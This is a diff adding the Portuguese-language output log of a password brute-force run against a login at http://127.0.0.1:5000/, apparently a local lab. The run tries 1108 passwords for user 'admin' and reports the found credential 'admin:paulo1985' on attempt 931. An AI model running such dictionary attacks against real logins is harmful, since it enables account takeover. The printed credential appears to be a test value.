@@ -1,0 +1,16 @@
+[*] Alvo: http://127.0.0.1:5000/
+[*] Usuario: admin
+[*] Senhas a testar: 1108
+--------------------------------------------------
+    ... 100 tentativas
+    ... 200 tentativas
+    ... 300 tentativas
+    ... 400 tentativas
+    ... 500 tentativas
+    ... 600 tentativas
+    ... 700 tentativas
+    ... 800 tentativas
+    ... 900 tentativas
+[+] SENHA ENCONTRADA (931a tentativa): admin:paulo1985
+    HTTP status: 302
+    Tempo: 4.95s
